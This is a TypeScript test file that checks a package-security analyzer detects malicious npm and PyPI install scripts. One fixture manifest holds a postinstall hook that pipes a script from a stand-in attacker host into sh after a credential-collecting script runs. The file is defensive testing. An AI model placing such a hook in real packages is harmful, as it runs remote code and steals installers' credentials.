import path from "node:path";
import { fileURLToPath } from "node:url";

import { describe, expect, it } from "vitest";

import { ManifestAnalyzer } from "./manifest-analyzer";
import type { PackageManifest, ScriptAnalysisInput } from "./types";

const fixturesDir = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "../fixtures");

function manifest(overrides: Partial<PackageManifest> = {}): PackageManifest {
  return { name: "fixture", version: "1.0.0", scripts: {}, dependencies: {}, optionalDependencies: {}, ...overrides };
}

describe("manifest analyzer — install-script worm detection", () => {
  it("flags a malicious npm postinstall worm as critical (no native binary required)", async () => {
    const analyzer = new ManifestAnalyzer();
    const input: ScriptAnalysisInput = {
      packageRequest: { ecosystem: "npm", packageName: "binshield-fixture-worm", version: "1.0.0" },
      packageRoot: path.join(fixturesDir, "malicious-postinstall"),
      manifest: manifest({
        name: "binshield-fixture-worm",
        scripts: { postinstall: "node scripts/collect.js && curl -s https://staging.evil.example.test/stage2.sh | sh" }
      })
    };

    const result = await analyzer.analyze(input);

    expect(result.hasInstallScripts).toBe(true);
    expect(result.riskLevel).toBe("critical");
    // The curl|sh in the postinstall hook.
    expect(result.findings.some((finding) => finding.category === "remoteCodeExecution")).toBe(true);
    // The credential harvesting in the referenced collect.js.
    expect(result.findings.some((finding) => finding.category === "environmentTheft")).toBe(true);
    expect(result.threats.remoteCodeExecution.detected).toBe(true);
  });

  it("flags a malicious PyPI setup.py as high or critical", async () => {
    const analyzer = new ManifestAnalyzer();
    const input: ScriptAnalysisInput = {
      packageRequest: { ecosystem: "pypi", packageName: "binshield-fixture-pypi-worm", version: "0.0.1" },
      packageRoot: path.join(fixturesDir, "malicious-setup-py"),
      manifest: manifest({ name: "binshield-fixture-pypi-worm", version: "0.0.1" })
    };

    const result = await analyzer.analyze(input);

    expect(result.hasInstallScripts).toBe(true);
    expect(["high", "critical"]).toContain(result.riskLevel);
    expect(result.findings.length).toBeGreaterThan(0);
  });

  it("does not flag a benign package with no install scripts", async () => {
    const analyzer = new ManifestAnalyzer();
    const input: ScriptAnalysisInput = {
      packageRequest: { ecosystem: "npm", packageName: "binshield-fixture-benign", version: "1.0.0" },
      packageRoot: path.join(fixturesDir, "benign-package"),
      manifest: manifest({ name: "binshield-fixture-benign" })
    };

    const result = await analyzer.analyze(input);

    expect(result.hasInstallScripts).toBe(false);
    expect(result.riskLevel).toBe("none");
    expect(result.findings).toHaveLength(0);
  });
});
